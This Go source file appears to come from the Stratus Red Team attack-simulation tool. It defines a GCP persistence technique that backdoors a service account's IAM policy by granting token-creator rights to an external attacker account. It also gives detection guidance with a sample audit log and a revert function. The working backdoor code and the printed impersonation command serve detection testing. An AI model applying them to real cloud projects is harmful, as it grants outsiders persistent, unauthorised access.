package gcp

import (
	"context"
	_ "embed"
	"errors"
	"fmt"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"log"

	gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	iam "google.golang.org/api/iam/v1"
)

//go:embed main.tf
var tf []byte

const codeBlock = "```"
const AttackTechniqueId = "gcp.persistence.backdoor-service-account-policy"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           AttackTechniqueId,
		FriendlyName: "Backdoor a GCP Service Account through its IAM Policy",
		Description: `
Backdoors a GCP service account by granting a fictitious attacker the ability to impersonate it and generate access temporary tokens for it.

Warm-up:

- Create a service account

Detonation:

- Backdoor the IAM policy of the service account to grant the role <code>` + RoleToGrant + `</code> to a fictitious attacker

Note that in GCP (contrary to AWS), the "IAM policy" of a service account is not granting permissions to the service account itself - rather,
it's a resource-based policy that grants permissions to other identities to impersonate the service account.

!!! info

	Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to ` + gcp_utils.DefaultFictitiousAttackerEmail + ` by default.
	This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override
	this behavior by setting the environment variable <code>` + utils.AttackerEmailEnvVarKey + `</code>, for instance:

	` + codeBlock + `bash
	export ` + utils.AttackerEmailEnvVarKey + `="your-own-gmail-account@gmail.com"
	stratus detonate ` + AttackTechniqueId + `
	` + codeBlock + `
`,
		Detection: `
You can detect when the IAM policy of a service account is updated using the GCP Admin Audit Logs event <code>google.iam.admin.v1.SetIAMPolicy</code> (sample below, shortened for clarity).

` + codeBlock + `json hl_lines="3 4 11 12 13 19 21"
{
  "protoPayload": {
    "serviceName": "iam.googleapis.com",
    "methodName": "google.iam.admin.v1.SetIAMPolicy",
    "resourceName": "projects/-/serviceAccounts/123456789",
    "serviceData": {
      "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
      "policyDelta": {
        "bindingDeltas": [
          {
            "action": "ADD",
            "role": "roles/iam.serviceAccountTokenCreator",
            "member": "user:stratusredteam@gmail.com"
          }
        ]
      }
    },
  "resource": {
    "type": "service_account",
    "labels": {
      "email_id": "stratus-red-team-bip-sa@victim-project.iam.gserviceaccount.com",
      "project_id": "victim-project"
    }
  },
  "logName": "projects/victim-project/logs/cloudaudit.googleapis.com%2Factivity",
}
` + codeBlock + `

When someone impersonates a service account, the GCP Admin Audit Logs event <code>google.iam.credentials.v1.GenerateAccessToken</code> is emitted if you explicitly
enabled <code>DATA_READ</code> events in the audit logs configuration of your project. For more information, see [Impersonate GCP Service Accounts](https://stratus-red-team.cloud/attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/#detection).
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

const DefaultFictitiousAttackerEmail = "stratusredteam@gmail.com"
const AttackerEmailEnvVarKey = "STRATUS_RED_TEAM_ATTACKER_EMAIL"
const RoleToGrant = "iam.serviceAccountTokenCreator"

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	attackerPrincipal := gcp_utils.GetAttackerPrincipal()
	policy := &iam.Policy{
		Bindings: []*iam.Binding{
			{
				Role:    fmt.Sprintf("roles/%s", RoleToGrant),
				Members: []string{attackerPrincipal},
			},
		},
	}
	log.Println("Granting " + attackerPrincipal + " " + RoleToGrant + " on " + params["sa_email"] + " through its IAM policy")
	err := setServiceAccountPolicy(providers, params["sa_email"], params["sa_id"], policy)
	if err != nil {
		return err
	}
	log.Println("The attacker can now impersonate the service account and generate access tokens for it, for instance using the following command:")
	log.Printf("gcloud --impersonate-service-account=%s storage ls\n", params["sa_email"])
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	policy := &iam.Policy{
		Bindings: []*iam.Binding{},
	}
	log.Println("Reverting the IAM policy of " + params["sa_email"])
	return setServiceAccountPolicy(providers, params["sa_email"], params["sa_id"], policy)
}

func setServiceAccountPolicy(providers stratus.CloudProviders, saEmail string, saId string, policy *iam.Policy) error {

	ctx := context.Background()
	service, err := iam.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return errors.New("Error instantiating GCP SDK Client: " + err.Error())
	}

	_, err = service.Projects.ServiceAccounts.SetIamPolicy(saId, &iam.SetIamPolicyRequest{Policy: policy}).Do()

	if err != nil {
		return fmt.Errorf("unable to set IAM policy of %s: %w", saEmail, err)
	}

	return nil
}
